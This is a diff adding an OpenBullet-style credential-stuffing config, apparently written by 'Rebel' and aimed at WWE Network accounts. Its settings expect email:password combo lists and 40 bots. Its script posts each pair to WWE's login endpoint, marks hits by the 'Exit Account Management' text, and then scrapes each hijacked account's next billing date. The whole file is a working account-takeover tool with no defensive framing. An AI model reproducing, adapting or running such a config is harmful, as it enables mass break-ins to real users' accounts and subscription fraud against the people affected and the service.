@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "WWE",
+  "SuggestedBots": 40,
+  "LastModified": "2018-05-28T04:11:38.3634012+00:00",
+  "AdditionalInfo": "Captures: Next Billing Date",
+  "Author": "Rebel",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://secure.net.wwe.com/workflow.do" AutoRedirect=TRUE 
+  CONTENT "registrationAction=identify&emailAddress=<USER>&password=<PASS>&submitButton=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "actionxCookie: %7B%22fired%22%3Afalse%7D" 
+  COOKIE "SESSION_1: wf_flowId%3D%3D%3Daccount.login%7Estage%3D%3D%3D3%7EflowId%3D%3D%3Daccount.login" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Authentication Error. Please check email and/or password and try again." 
+  KEYCHAIN Success OR 
+    KEY "Exit Account Management" 
+REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=subscriptions.updatesubscription" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "Your next billing date is <b>" "<" Recursive=FALSE -> CAP "Next Billing Date" "" "" 
